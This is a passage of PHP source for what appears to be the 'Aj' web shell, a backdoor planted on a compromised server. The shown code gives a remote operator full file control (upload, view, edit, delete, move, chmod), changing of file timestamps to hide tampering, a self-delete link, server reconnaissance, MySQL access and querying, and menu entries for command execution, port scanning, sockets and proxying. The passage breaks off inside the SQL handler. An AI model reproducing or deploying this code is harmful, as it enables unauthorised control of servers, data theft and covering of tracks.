if ((strlen($GLOB['REMOTE']['USER']['Login']) + strlen($GLOB['REMOTE']['USER']['Passw'])) >= 2)
    echo "\n" . '<a href="' . AjURL('kill', 'ajinstant') . '&ajinstant=logoff" title="Log Off" class=no>[Exit]</a>';
echo "\n" . '<a href="' . AjURL('kill', 'ajinstant') . '&ajinstant=DEL" title="Delete self (' . basename($_SERVER['PHP_SELF']) . ')" class=no><font color=#FF0000;>' . AjImg('del') . '</font></a>';
echo "\n" . '</nobr></td></tr></table></span>';

echo "\n\n" . '<hr>';
echo "\n" . 'Disk free: <b>' . AjStr_FmtFileSize(disk_free_space($GLOB['FILES']['CurDIR'])) . ' / ' . AjStr_FmtFileSize(disk_total_space($GLOB['FILES']['CurDIR'])) . '</b> ; ';
echo "\n" . 'OS: <b>' . $GLOB['SYS']['OS']['id'] . ' (' . $GLOB['SYS']['OS']['Full'] . ' )</b> ; ';
echo "\n" . 'Yer_IP: <b>' . @$_SERVER['REMOTE_ADDR'] . ' (' . @$_SERVER['REMOTE_HOST'] . ')</b> ; ';
echo "\n" . '<nobr>Own/U/G/Pid/Inode:<wbr><b>' . get_current_user() . ' / ' . getmyuid() . ' / ' . getmygid() . ' / ' . getmypid() . ' / ' . getmyinode() . '</b> ; </nobr>';
echo "\n" . 'MySQL : <b>' . @mysql_get_server_info() . '</b> ; ';
echo "\n" . '<br>' . @$_SERVER['SERVER_SOFTWARE'];
?>
  </td>
</table>
<table width=100% cellspacing=0 cellpadding=0 class=outset>
<tr>
	<td width=100pt class=h2_oneline><h2>Modes</td>
	<td style="text-align:center;"><nobr>
	<a href="<?php echo AjURL('kill', ''); ?>&ajmode=DIR">DIR</a> |
	<a href="<?php echo AjURL('kill', ''); ?>&ajmode=F_VIEW">VIEW</a> |
	<a href="<?php echo AjURL('kill', '');?>&ajmode=FTP<?=((!empty($_GET['ajdir']))?'&ajdir=' . $_GET['ajdir'] : ''); ?>">FTP</a>
	<td><font class=highlight_txt><big><b>II</td><td style="text-align:center;"><nobr>
	<a href="<?php echo AjURL('leave', 'ajsql_s,ajsql_l,ajsql_p,ajsql_d');?>&ajmode=SQL">SQL</a> |
	<a href="<?php echo AjURL('kill', '');?>&ajmode=PHP">PHP</a> |
	<a href="<?php echo AjURL('kill', '');?>&ajmode=COOK">COOKIE</a> |
	<a href="<?php echo AjURL('kill', '');?>&ajmode=CMD">CMD</a>
	<td><font class=highlight_txt><big><b>II</td><td style="text-align:center;"><nobr>
	<a href="<?php echo AjURL('kill', '');?>&ajmode=MAIL">MAIL</a> |
	<a href="<?php echo AjURL('kill', '');?>&ajmode=STR">STR</a> |
	<a href="<?php echo AjURL('kill', '');?>&ajmode=PRT">PORTSCAN</a> |
	<a href="<?php echo AjURL('kill', '');?>&ajmode=SOCK">SOCK</a> |
	<a href="<?php echo AjURL('kill', '');?>&ajmode=PROX">PROXY</a>
	</td>
	</tr>
</table>
<?php
$AJ_Header_drawn = true;
?>

<?php
#################################################
########
########   AJGLOBALVARS DOWNLOADER
########
if (isset($AjDOWNLOAD_File)) {
    echo "\n" . '<table align=center><tr><td class=mode_header><b>Download file</td></tr></table>';
    echo "\n" . '<br>Exclusively, Aj is proud to present an additional way to download files...Just execute the php-script given below, and it will make the file u\'re trying to download';
    
    if ($GLOB['SYS']['GZIP']['CanUse'])
        $AjDOWNLOAD_File['content'] = gzcompress($AjDOWNLOAD_File['content'], 6);
    
    echo "\n\n" . '<br><br>';
    echo "\n" . '<textarea rows=30 style="width:90%" align=center>';
    echo "\n" . '<?php' . "\n" . ' //Execute this, and you\'ll get the requested "' . $AjDOWNLOAD_File['filename'] . '" in the same folder with the script ;)';
    echo "\n" . '// The file is ' . (($GLOB['SYS']['GZIP']['CanUse']) ? 'gzcompress()ed and' : '') . ' base64_encode()ed';
    echo "\n\n" . '$encoded_file=\'' . base64_encode($AjDOWNLOAD_File['content']) . '\';';
    echo "\n\n\n\n";
    echo "\n" . '$f=fopen(\'' . $AjDOWNLOAD_File['filename'] . '\', \'w\');';
    echo "\n" . 'fputs($f, ' . (($GLOB['SYS']['GZIP']['CanUse']) ? 'gzuncompress(base64_decode($encoded_file))' : 'base64_decode($encoded_file)') . ');';
    echo "\n" . 'fclose($f);';
    echo "\n" . '?>';
    echo "\n" . '</textarea>';
    die();
}

?>

<table align=center>
    <tr><td class=mode_header>
    @MODE: <b><?php echo $GLOB['AjMODES'][$_GET['ajmode']]; ?>
  </td></tr></table>
<?php
########
########   File Global Actions
########

if (substr($_GET['ajmode'], 0, 2) == 'F_') {
    if (empty($_GET['ajfile'])) {
        echo "\n" . '<form action="' . AjURL('kill', '') . '" method=GET>';
        AjGETinForm('leave', '');
        echo "\n" . '<input type=text name="ajfile" value="" style="width:70%;">';
        echo "\n" . '<br><input type=submit value="Select" class="submit">';
        echo "\n" . '</form>';
    }
    if (!file_exists(@$_GET['ajfile']))
        die(AjError('No such file'));
    echo "\n\n".'<a href="'.AjURL('kill', '').'&ajmode=DIR&ajdir='.AjFileToUrl(dirname($_GET['ajfile'])).'">[Go DIR]</a>';
}


switch ($_GET['ajmode']) {
    
    ########
    ########   Upload file
    ########
    case 'UPL':
        if (empty($_POST['ajdir']) AND empty($_GET['ajdir']))
            die(AjError('Uploading without selecting directory $_POST/$_GET[\'ajdir\'] is restricted'));
        
        if (isset($_FILES['aj_uplfile']['tmp_name'])) {
            $GETFILE = file_get_contents($_FILES['aj_uplfile']['tmp_name']);
            AjFiles_UploadHere($_POST['ajdir'], $_FILES['aj_uplfile']['name'], $GETFILE);
        } else {
            echo "\n" . '<form action="' . AjURL('leave', 'ajmode,ajsimple') . '" enctype="multipart/form-data" method=POST>';
            echo "\n" . '<input type="hidden" name="MAX_FILE_SIZE" value="' . $GLOB['PHP']['upload_max_filesize'] . '">';
            echo "\n" . '<font class="highlight_txt">Max: ' . AjStr_FmtFileSize($GLOB['PHP']['upload_max_filesize']) . '</font>';
            echo "\n" . '<br><input type=text name="ajdir" value="' . $_GET['ajdir'] . '" SIZE=50>';
            echo "\n" . '<br><input type=file name="aj_uplfile" SIZE=50>';
            echo "\n" . '<input type=submit value="Upload" class="submit"></form>';
        }
        break;
    
    ########
    ########   Directory listings
    ########
    case 'DIR':
        if (empty($_GET['ajdir']))
            $_GET['ajdir'] = realpath($GLOB['FILES']['CurDIR']);
        $_GET['ajdir'] = AjFileOkaySlashes($_GET['ajdir']);
        if (substr($_GET['ajdir'], -1, 1) != '/')
            $_GET['ajdir'] .= '/';
        
        echo "\n" . '<br><form action="' . AjURL('kill', '') . '" method=GET style="display:inline;">';
        AjGETinForm('leave', 'ajmode');
        echo "\n" . '<input type=text name="ajdir" value="' . AjFileOkaySlashes(realpath($_GET['ajdir'])) . '" SIZE=40>';
        echo "\n" . '<input type=submit value="Goto" class="submit"></form>';
        
        echo "\n" . '<br>' . '<b>&gt;&gt; <b>' . $_GET['ajdir'] . '</b>';
        if (!file_exists($_GET['ajdir']))
            die(AjError('No such directory'));
        if (!is_dir($_GET['ajdir']))
            die(AjError('It\'s a file!! What do you think about listing files in a file? =)) '));
        
        if (isset($_GET['ajparam'])) {
            if ($_GET['ajparam'] == 'mkDIR')
                if (!mkdir($_GET['ajdir'] . '__NEWDIR__' . AjRandomChars(3)))
                    AjError('Unable to mkDir. Perms?');
            if ($_GET['ajparam'] == 'mkFILE')
                if (!touch($_GET['ajdir'] . '_NEWDIR__' . AjRandomChars(3)))
                    AjError('Unable to mkFile. Perms?');
        }
        
        if (!($dir_ptr = opendir($_GET['ajdir'])))
            die(AjError('Unable to open dir for reading. Perms?...'));
        $FILES = array(
            'DIRS' => array(),
            'FILES' => array()
        );
        while (!is_bool($file = readdir($dir_ptr)))
            if (($file != '.') and ($file != '..'))
                if (is_dir($_GET['ajdir'] . $file))
                    $FILES['DIRS'][] = $file;
                else
                    $FILES['FILES'][] = $file;
        asort($FILES['DIRS']);
        asort($FILES['FILES']);
        
        echo "\n" . '<span style="position:absolute;right:0pt;">';
        if (isset($_GET['ajdirsimple']))
            echo '<a href="' . AjURL('kill', 'ajdirsimple') . '">[Switch to FULL]</a>';
        else
            echo '<a href="' . AjURL('leave', '') . '&ajdirsimple=1">[Switch to LITE]</a>';
        echo '</span>';
        
        $folderup_link = explode('/', $_GET['ajdir'] . '../');
        if (!empty($folderup_link[count($folderup_link) - 3]) AND ($folderup_link[count($folderup_link) - 3] != '..'))
            unset($folderup_link[count($folderup_link) - 3], $folderup_link[count($folderup_link) - 1]);
        $folderup_link = implode('/', $folderup_link);
        echo "\n" . str_repeat('&nbsp;', 3) . '<a href="' . AjURL('leave', 'ajdirsimple') . '&ajmode=DIR&ajdir=' . $folderup_link . '" class=no>' . AjImg('foldup') . ' ../</a>';
        
        echo "\n" . str_repeat('&nbsp;', 15) . '<font class=highlight_txt>MAKE: </font>' . '<a href="' . AjURL('leave', 'ajmode,ajdir,ajdirsimple') . '&ajparam=mkDIR">Dir</a>' . ' / ' . '<a href="' . AjURL('leave', 'ajmode,ajdir,ajdirsimple') . '&ajparam=mkFILE">File</a>' . ' / ' . str_repeat('&nbsp;', 5) . '<font class=highlight_txt>UPLOAD: </font>' . '<a href="' . AjURL('leave', 'ajdirsimple') . '&ajdir=' . AjFileToUrl($_GET['ajdir']) . '&ajmode=UPL">Form</a>' . ' / ' . '<a href="' . AjURL('leave', 'ajdirsimple') . '&ajdir=' . AjFileToUrl($_GET['ajdir']) . '&ajmode=UPL">FTP</a>';
        
        echo "\n" . '<br>' . count($FILES['DIRS']) . ' dirs, ' . count($FILES['FILES']) . ' files ';
        echo "\n" . '<table border=0 cellspacing=0 cellpadding=0 ><COL span=15 class="linelisting">';
        for ($NOWi = 0; $NOWi <= 1; $NOWi++)
            for ($NOW = ($NOWi == 0) ? 'DIRS' : 'FILES', $i = 0; $i < count($FILES[$NOW]); $i++) {
                $cur =& $FILES[$NOW][$i];
                $dircur = $_GET['ajdir'] . $cur;
                echo "\n" . '<tr>';
                echo "\n\t" . '<td class=linelisting ' . ((isset($_GET['ajdirsimple']) AND ($NOW == 'DIRS')) ? 'colspan=2' : '') . '>' . (($NOW == 'DIRS') ? AjImg('folder') . ' ' . '<a href="' . AjURL('leave', 'ajdirsimple') . '&ajmode=DIR&ajdir=' . AjFileToUrl($dircur) . '" class=no>' : '') . (($NOW == 'FILES') ? '<a href="' . AjURL('kill', '') . '&ajmode=F_VIEW&ajfile=' . AjFileToUrl($dircur) . '" class=no>' : '') . htmlspecialchars($cur) . '</td>';
                
				
                if (!isset($_GET['ajdirsimple'])) {
                    echo "\n\t" . '<td title="Create time: ' . AjDate(@filectime($dircur)) . ' ' . ' Modify time: ' . AjDate(@filemtime($dircur)) . ' ' . 'Owner/Group: ' . (@fileowner($dircur)) . ' / ' . (@filegroup($dircur)) . '" class=linelisting>' . '<span class=Hover><b>INFO</span> <a href="' . AjURL('kill', '') . '&ajmode=F_CHTIME&ajfile=' . AjFileToUrl($dircur) . '" class=no>' . AjDate(@filemtime($dircur)) . '</a></td>';
                    echo "\n\t" . '<td class=linelisting ' . (($NOW == 'DIRS') ? 'colspan=2' : '') . '>' . ((($i + $NOWi) == 0) ? '<span ' . AjDesign_DrawBubbleBox('Perms legend', '1st: sticky bit:<br>"<b>S</b>" Socket, "<b>L</b>" Symbolic Link, "<b>&lt;empty&gt;</b>" Regular, "<b>B</b>" Block special, "<b>D</b>" Directory, "<b>C</b>" Character special, "<b>P</b>" FIFO Pipe, "<b>?</b>" Unknown<br>Others: Owner/Group/World<br>"<b>r</b>" Read, "<b>w</b>" Write, "<b>x</b>" Execute<br><br><b>Click to CHMOD', 400) . ' class=Hover>' : '') . '<a href="' . AjURL('kill', '') . '&ajmode=F_CHM&ajfile=' . AjFileToUrl($dircur) . '" class=no>' . AjChmod_Oct2Str(@fileperms($dircur)) . '</td>';
                }
		   
                
                if ($NOW != 'DIRS')
                    echo "\n\t" . '<td class=linelisting style="text-align:right;">' . AjStr_FmtFileSize(@filesize($dircur)) . '</td>';
                
                if (!isset($_GET['ajdirsimple'])) {
                    if ($NOW == 'DIRS')
                        echo "\n\t" . '<td class=linelisting colspan=' . (($GLOB['SYS']['GZIP']['IMG'] OR $GLOB['SYS']['ZIP']['IMG']) ? '4' : '3') . '>&nbsp;</td>';
                    if ($NOW != 'DIRS')
                        echo "\n\t" . '<td class=linelisting><a href="' . AjURL('kill', '') . '&ajmode=F_DWN&ajparam=SRC&ajfile=' . AjFileToUrl($dircur) . '" target=_blank>' . AjImg('view') . '</a></td>';
                    if ($NOW != 'DIRS')
                        echo "\n\t" . '<td class=linelisting><a href="' . AjURL('kill', '') . '&ajmode=F_ED&ajfile=' . AjFileToUrl($dircur) . '">' . AjImg('ed') . '</a></td>';
                    if ($NOW != 'DIRS')
                        echo "\n\t" . '<td class=linelisting><a href="' . AjURL('kill', '') . '&ajmode=F_DWN&ajfile=' . AjFileToUrl($dircur) . '">' . AjImg('downl') . '</a></td>';
                    if (($NOW != 'DIRS') AND ($GLOB['SYS']['GZIP']['IMG'])){
						$path_parts = pathinfo(AjFileToUrl($dircur));
						
						if ($path_parts['extension'] == 'zip') {
							echo "\n\t" . '<td class=linelisting><a href="' . AjURL('kill', '') . '&ajmode=UNZIP&ajfile=' . AjFileToUrl($dircur) . '">' . AjImg('unzip') . '</a></td>';
						} else							
							echo "\n\t" . '<td class=linelisting><a href="' . AjURL('kill', '') . '&ajmode=ZIP&aj_zip=' . AjFileToUrl($dircur) . '">' . AjImg('gzip') . '</a></td>';
					}	
					elseif (($NOW == 'DIRS') AND ($GLOB['SYS']['ZIP']['IMG']))
						 echo "\n\t" . '<td class=linelisting><a href="' . AjURL('kill', '') . '&ajmode=ZIP&aj_zipdir=' . AjFileToUrl($dircur) . '">' . AjImg('gzip') . '</a></td>';
					
                    echo "\n\t" . '<td class=linelisting><a href="' . AjURL('kill', '') . '&ajmode=F_REN&ajfile=' . AjFileToUrl($dircur) . '">' . AjImg('rename') . '</a></td>';
                   
					echo "\n\t" . '<td class=linelisting ' . (($NOW == 'DIRS') ? 'colspan=3' : '') . '>';
				   
					if ($NOW == 'DIRS') {
					   echo '<a href="' . AjURL('kill', '') . '&ajmode=D_DEL&ajdir=' . AjFileToUrl($dircur). '">' . AjImg('del') . '</a></td>';
					} else {
						echo '<a href="' . AjURL('kill', '') . '&ajmode=F_DEL&ajfile=' . AjFileToUrl($dircur). '">' . AjImg('del') . '</a></td>';
					} 
					
                    if ($NOW != 'DIRS')
                        echo "\n\t" . '<td class=linelisting><a href="' . AjURL('kill', '') . '&ajmode=F_COP&ajfile=' . AjFileToUrl($dircur) . '">' . AjImg('copy') . '</a></td>';
                    if ($NOW != 'DIRS')
                        echo "\n\t" . '<td class=linelisting><a href="' . AjURL('kill', '') . '&ajmode=F_MOV&ajfile=' . AjFileToUrl($dircur) . '">' . AjImg('move') . '</a></td>';
                }
                echo "\n\t" . '</tr>';
            }
        echo "\n" . '</table>';
        break;
		
	########
    ########   File timechange
    ########
	case 'F_CHTIME':
		if (isset($_GET['y']) && isset($_GET['m']) && isset($_GET['d'])) {
            if (touch($_GET['ajfile'], mktime((int)$_GET['h'], (int)$_GET['i'], (int)$_GET['s'], (int)$_GET['m'], (int)$_GET['d'], (int)$_GET['y'])) == false)
                echo AjError('Chtime "' . $_GET['ajfile'] . '" failed');
            else
                echo 'CHTIME( <font class=highlight_txt>' . $_GET['ajfile'] . '</b></font> )...<b>OK</b>';
        } else {
            echo "\n" . '<form action="' . AjURL('kill', '') . '" method=GET>';
            AjGETinForm('leave', 'ajmode,ajfile');
            echo "\n" . 'CHMOD( <font class=highlight_txt>' . $_GET['ajfile'] . '</font> )';
            echo "\n" . '<br>Hours <input type=text name="h" value="' . AjDateH(@filemtime($_GET['ajfile'])). '">';
			echo "\n" . '<br>Minuts <input type=text name="i" value="' . AjDateI(@filemtime($_GET['ajfile'])). '">';
			echo "\n" . '<br>Seconds <input type=text name="s" value="' . AjDateS(@filemtime($_GET['ajfile'])). '">';
			echo "\n" . '<br>Day<input type=text name="d" value="' . AjDateD(@filemtime($_GET['ajfile'])). '">';
			echo "\n" . '<br>Month<input type=text name="m" value="' . AjDateM(@filemtime($_GET['ajfile'])). '">';
			echo "\n" . '<br>Year<input type=text name="y" value="' . AjDateY(@filemtime($_GET['ajfile'])). '">';
            echo "\n" . '<input type=submit value="chtime" class="submit"></form>';
        }
        break;

    ########
    ########   File CHMOD
    ########
    case 'F_CHM':
        if (isset($_GET['ajparam'])) {
            if (chmod($_GET['ajfile'], octdec((int) $_GET['ajparam'])) == false)
                echo AjError('Chmod "' . $_GET['ajfile'] . '" failed');
            else
                echo 'CHMOD( <font class=highlight_txt>' . $_GET['ajfile'] . '</b></font> )...<b>OK</b>';
        } else {
            echo "\n" . '<form action="' . AjURL('kill', '') . '" method=GET>';
            AjGETinForm('leave', 'ajmode,ajfile');
            echo "\n" . 'CHMOD( <font class=highlight_txt>' . $_GET['ajfile'] . '</font> )';
            echo "\n" . '<br><input type=text name="ajparam" value="' . 
            //decoct(fileperms($_GET['ajfile']))
                substr(sprintf('%o', fileperms($_GET['ajfile'])), -4) . '">';
            echo "\n" . '<input type=submit value="chmod" class="submit"></form>';
        }
        break;
    
    ########
    ########   File View
    ########
    case 'F_VIEW':
        if (!is_file($_GET['ajfile']))
            die(AjError('Hey! Find out how to read a directory in notepad, and u can call me "Lame" =) '));
        if (!is_readable($_GET['ajfile']))
            die(AjError('File is not readable. Perms?...'));
        
        echo "\n" . '<table border=0 cellspacing=0 cellpadding=0 align=right><tr>';
        echo "\n" . '<td><h3>' . $_GET['ajfile'] . '</h3></td>';
        echo "\n" . '<td>' . '<a href="' . AjURL('kill', '') . '&ajmode=F_DWN&ajparam=SRC&ajfile=' . AjFileToUrl($_GET['ajfile']) . '" target=_blank>' . AjImg('view') . '</a>' . '<a href="' . AjURL('kill', '') . '&ajmode=F_ED&ajfile=' . AjFileToUrl($_GET['ajfile']) . '">' . AjImg('ed') . '</a>' . '<a href="' . AjURL('kill', '') . '&ajmode=F_DWN&ajfile=' . AjFileToUrl($_GET['ajfile']) . '">' . AjImg('downl') . '</a>' . '<a href="' . AjURL('kill', '') . '&ajmode=F_DEL&ajfile=' . AjFileToUrl($_GET['ajfile']) . '">' . AjImg('del') . '</a>' . '</td>';
        echo "\n" . '</tr></table><br>';
        echo "\n" . 'Tip: to view the file "as is" - open the page in <a href="' . AjURL('kill', '') . '&ajmode=F_DWN&ajparam=SRC&ajfile=' . AjFileToUrl($_GET['ajfile']) . '">source</a>, or <a href="' . AjURL('kill', '') . '&ajmode=F_DWN&ajfile=' . AjFileToUrl($_GET['ajfile']) . '">download</a> this file';
        
        echo "\n\n\n" . '<br><hr><!-- File contents goes from here -->' . "\n";
        echo "\n" . '<plaintext>';
        echo file_get_contents($_GET['ajfile']);
        die();
        break;
    
    ########
    ########   File Edit
    ########
    case 'F_ED':
        if (!is_file($_GET['ajfile']))
            die(AjError('Hey! Find out how to read a directory in notepad, and u can call me "Lame" =) '));
        if (isset($_POST['ajparam'])) {
            if (!is_writable($_GET['ajfile']))
                die(AjError('File is not writable. Perms?...'));
            if (($f = fopen($_GET['ajfile'], 'w')) === false)
                die(AjError('File open for WRITE failed'));
            if (fputs($f, $_POST['ajparam']) === false)
                die(AjError('I/O: File write failed'));
            fclose($f);
            echo 'File saved OK;';
        } else {
            if (!is_readable($_GET['ajfile']))
                die(AjError('File is not readable. Perms?...'));
            if (!is_writable($_GET['ajfile']))
                AjWarning('File is not writable!');
            echo "\n" . '<font class=highlight_txt>' . $_GET['ajfile'] . '</font>';
            echo "\n" . '<form action="' . AjURL('leave', '') . '" method=POST>';
            echo "\n" . '<textarea name="ajparam" rows=30 style="width:90%;">' . str_replace(array(
                '<',
                '>'
            ), array(
                '&lt;',
                '&gt;'
            ), file_get_contents($_GET['ajfile'])) . '</textarea>';
            echo "\n" . '<br><input type=submit value="Save" style="width:100pt;height:50pt;font-size:15pt;" class=submit>';
            echo "\n" . '</form>';
        }
        break;
    
    ########
    ########   File Delete
    ########
    case 'F_DEL':
        if (isset($_GET['aj_ok'])) {
            if ($_GET['aj_ok'] == 'Yes') {
                if ((is_file($_GET['ajfile']) AND !unlink($_GET['ajfile'])) OR (is_dir($_GET['ajfile']) AND !rmdir($_GET['ajfile'])))
                    echo AjError('Unable to delete file. Perms?...<br>');
                else {
                    echo "\n" . 'Delete( <font class=highlight_txt>' . $_GET['ajfile'] . '</font> ) <b>OK</b>';
                    AjGotoURL(AjURL('kill', '') . '&ajmode=DIR&ajdir=' . AjFileToUrl(dirname($_GET['ajfile'])));
                }
            }
        } else {
            if (!is_writable($_GET['ajfile']))
                AjWarning('File is not writable!');
            echo "\n" . '<form action="' . AjURL('kill', '') . '" method=GET>';
            AjGETinForm('leave', 'ajmode,ajfile');
            echo "\n" . '<table border=0 cellspacing=0 cellpadding=0 align=center><tr><td>' . "\n" . '<font class=achtung>(!)</font> Do you really want to <font class=highlight_txt>DELETE ' . $_GET['ajfile'] . '</font> ?' . "\n" . '<div align=right><input type=submit name="aj_ok" value="No" class=bt_No><input type=submit name="aj_ok" value="Yes" class=bt_Yes>' . "\n" . '</td></tr></table>';
            echo "\n" . '</form>';
        }
        break;
		
	######
	###### Folder Delete
	######
	case 'D_DEL':
		if (isset($_GET['aj_ok'])) {
            if ($_GET['aj_ok'] == 'Yes') {
                if (AjRDir($_GET['ajdir'])) {
					echo AjError('Unable to delete folder. Perms?...<br>');
				} else {
					echo "\n" . 'Delete( <font class=highlight_txt>' . $_GET['ajdir'] . '</font> ) <b>OK</b>';
                    AjGotoURL(AjURL('kill', '') . '&ajmode=DIR&ajdir=' . AjFileToUrl(dirname($_GET['ajdir'])));
				}          
            }
        } else {
            if (!is_writable(dirname($_GET['ajdir'])))
                AjWarning('Folder is not writable!');
            echo "\n" . '<form action="' . AjURL('kill', '') . '" method=GET>';
            AjGETinForm('leave', 'ajmode,ajdir');
            echo "\n" . '<table border=0 cellspacing=0 cellpadding=0 align=center><tr><td>' . "\n" . '<font class=achtung>(!)</font> Do you really want to <font class=highlight_txt>DELETE ' . $_GET['ajdir'] . '</font> ?' . "\n" . '<div align=right><input type=submit name="aj_ok" value="No" class=bt_No><input type=submit name="aj_ok" value="Yes" class=bt_Yes>' . "\n" . '</td></tr></table>';
            echo "\n" . '</form>';
        }
		break;		
    
    ########
    ########   File Rename
    ########
    case 'F_REN':
        if (isset($_POST['ajparam'])) {
            if (!rename($_GET['ajfile'], dirname($_GET['ajfile']) . '/' . $_POST['ajparam']))
                echo AjError('Unable to rename. Perms?...<br>');
            else {
                echo "\n" . 'Rename( <font class=highlight_txt>' . $_GET['ajfile'] . '</font> -> <font class=highlight_txt>' . dirname($_GET['ajfile']) . '/' . $_POST['ajparam'] . '</font> ) <b>OK</b>';
                AjGotoURL(AjURL('kill', '') . '&ajmode=DIR&ajdir=' . AjFileToUrl(dirname($_GET['ajfile'])));
            }
        } else {
            echo "\n" . '<form action="' . AjURL('leave', 'ajmode,ajfile') . '" method=POST>';
            echo "\n" . '<input type=text name="ajparam" value="' . basename($_GET['ajfile']) . '" style="width:80%">';
            echo "\n" . '<input type=submit value="Rename" class="submit"></form>';
        }
        break;
    
    ########
    ########   File Copy
    ########
    case 'F_COP':
        if (!is_file($_GET['ajfile']))
            die(AjError('Don\'t even think about copuing directories! =))'));
        
        $newname = $_GET['ajfile'] . '__COPY_' . AjRandomChars(3);
        if (($extpos = strrpos($_GET['ajfile'], '.')) > strrpos($_GET['ajfile'], '/')) 
            $newname = substr($_GET['ajfile'], 0, $extpos) . '__COPY_' . AjRandomChars(3) . substr($_GET['ajfile'], $extpos);
        echo $newname;
        if (!copy($_GET['ajfile'], $newname))
            echo AjError('Unable to copy. Perms?...<br>');
        else {
            echo "\n" . 'Copy( <font class=highlight_txt>' . $_GET['ajfile'] . '</font> -> <font class=highlight_txt>' . $newname . '</font> ) <b>OK</b>';
            AjGotoURL(AjURL('kill', '') . '&ajmode=DIR&ajdir=' . AjFileToUrl(dirname($_GET['ajfile'])));
        }
        break;
    
    ########
    ########   File Move
    ########
    case 'F_MOV':
        if (isset($_POST['ajparam'])) {
            if (!rename($_GET['ajfile'], $_POST['ajparam']))
                echo AjError('Unable to rename. Perms? Or no path?...<br>');
            else {
                echo "\n" . 'Move( <font class=highlight_txt>' . $_GET['ajfile'] . '</font> -> <font class=highlight_txt>' . $_POST['ajparam'] . '</font> ) <b>OK</b>';
                AjGotoURL(AjURL('kill', '') . '&ajmode=DIR&ajdir=' . AjFileToUrl(dirname($_POST['ajparam'])));
            }
        } else {
            if (!is_writable($_GET['ajfile']))
                AjWarning('File is not writable!');
            echo "\n" . '<form action="' . AjURL('leave', 'ajmode,ajfile') . '" method=POST>';
            echo "\n" . '<input type=text name="ajparam" value="' . AjFileOkaySlashes(realpath($_GET['ajfile'])) . '" style="width:80%">';
            echo "\n" . '<input type=submit value="M0ve" class="submit"></form>';
        }
        break;
    
    ########
    ########   SQL Maintenance
    ########
    case 'SQL':
        if (!isset($_GET['ajsql_s'], $_GET['ajsql_l'], $_GET['ajsql_p'])) {
            echo "\n" . '<h2>MySQL connection</h2>';
            echo "\n" . '<form action="' . AjURL('kill', '') . '" method=GET align=center>';
            AjGETinForm('leave', 'ajmode');
            echo "\n" . '<br>Serv: <input type=text name="ajsql_s" value="localhost" style="width:200pt">';
            echo "\n" . '<br>Login:<input type=text name="ajsql_l" value=""  style="width:200pt">';
            echo "\n" . '<br>Passw:<input type=password name="ajsql_p" value="" style="width:200pt">';
            echo "\n" . '<br><input type=submit value="C0nnect" class="submit" style="width:200pt;"></form>';
            die();
        }
		
		$dbh = new mysqli($_GET['ajsql_s'], $_GET['ajsql_l'], $_GET['ajsql_p']);
		
		if(mysqli_connect_errno()){
			die(AjError('No connection to mysql server!' . "\n" . '<br>MySQL:#' . mysqli_connect_error()));
		} else {
			 echo '&gt;&gt; MySQL connected!';
		}
		
		AjMySQLQ("SET NAMES 'utf8';", false);
		
		$result = $dbh->query("SELECT VERSION()");		
		$mysqlver = $result->fetch_array();
        echo str_repeat('&nbsp;', 15) . 'MySQL version: <font class="highlight_txt">' . $mysqlver[0] . '</font>';
        
		AjMySQL_FetchResult(AjMySQLQ('SHOW DATABASES;', true), $DATABASES, true);

		
        for ($i = 0; $i < count($DATABASES); $i++){
			$rt = AjMySQLQ('SHOW TABLES FROM `' . $DATABASES[$i][0] . '`;', false);
			$DATABASES[$i][1] = $rt->num_rows;
		}

        echo "\n" . '<table border=0 cellspacing=0 cellpadding=0>' . '<tr><td class=h2_oneline><h1>DB:</h1></td>';
        if (!isset($_GET['ajsql_d'])) {
            echo "\n" . '<td class=h2_oneline style="border-width:0pt;">';
            echo "\n" . '<form action="' . AjURL('kill', '') . '" method=GET>';
            AjGETinForm('leave', 'ajmode,ajsql_s,ajsql_l,ajsql_p');
            echo "\n" . '<SELECT name="ajsql_d" onchange="this.form.submit()">';
            echo "\n\t" . '<OPTION value="">&lt;Server&gt;</OPTION>';
            for ($i = 0; $i < count($DATABASES); $i++)
                echo "\n\t" . '<OPTION value="' . $DATABASES[$i][0] . '">' . '[' . AjZeroedNumber($DATABASES[$i][1], 3) . ']' . ' ' . $DATABASES[$i][0] . '</OPTION>';
            echo "\n" . '</SELECT><input type=submit value="-&gt;" class=submit"></form></td>';
            echo "\n" . '</tr></table>';
            die();
        } else
            echo "\n" . '<td class=linelisting><font class=highlight_txt>' . ((empty($_GET['ajsql_d'])) ? '&lt;Server&gt;' : $_GET['ajsql_d']) . '</font></td>' . '<td class=linelisting><a href="' . AjURL('kill', 'ajsql_d') . '" class=no>[CH]</a></td>' . '<td class=linelisting><a href="' . AjURL('kill', 'ajmode') . '&ajmode=SQLS" class=no>[Search in tables...]</a></td>' . '<td class=linelisting><a href="' . AjURL('kill', 'ajmode') . '&ajmode=SQLD" class=no>[Dump...]</a></td>' . '</tr></table>';
        
        if (!empty($_GET['ajsql_d']))
            if (!$dbh->select_db($_GET['ajsql_d']))
                die(AjError('Can\'t select database!' . "\n" . '<br>MySQL:#' . $dbh->error));
        
        echo "\n" . '<table border=0 cellspacing=0 cellpadding=0 width=100%>';
        echo "\n" . '<tr><td width=1% class=h2_oneline style="vertical-align:top;">';
        if (!empty($_GET['ajsql_d'])) {
            echo "\n\t" . '<table  border=0 cellspacing=0 cellpadding=0>';
            echo "\n\t" . '<caption>Tables:</caption>';
            AjMySQL_FetchResult(AjMySQLQ('SHOW TABLES;', true), $TABLES, true);
            for ($i = 0; $i < count($TABLES); $i++)
                $TABLES[$i] = $TABLES[$i][0];
            asort($TABLES);
			
			
			
            for ($i = 0; $i < count($TABLES); $i++) {
                AjMySQL_FetchResult(AjMySQLQ('SELECT COUNT(*) FROM `' . $TABLES[$i] . '`;', true), $TRowCnt, true);
                echo "\n\t" . '<tr><td class="listing"><nobr>' . (($TRowCnt[0][0] > 0) ? '&gt; ' : '&nbsp;&nbsp;') . $TABLES[$i] . '</td></tr>';
            }
            echo "\n\t" . '</table>';
        }
        echo "\n" . '</td><td  width=100%>';
        echo "\n" . '<form action="' . AjURL('leave', '') . '" method=POST>';
        echo "\n" . '[?] Can run several querys if divided by ";"<br>If smth is wrong with charset, write first: SET NAMES utf8;';
        echo "\n" . '<textarea name="ajsql_q" rows=10 style="width:100%;">' . ((empty($_POST['ajsql_q'])) ? '' : $_POST['ajsql_q']) . '</textarea>';
        echo "\n" . '<div align=right>' . '<input type=submit value="Query" class="submit"> ' . '<input type=submit name="ajparam" value="Download Query" class="submit"></div></form>' . '<br>';
        
        if (empty($_POST['ajsql_q']))
            die('</td></tr></table>');
        $_POST['ajsql_q'] = explode(';', $_POST['ajsql_q']);
        
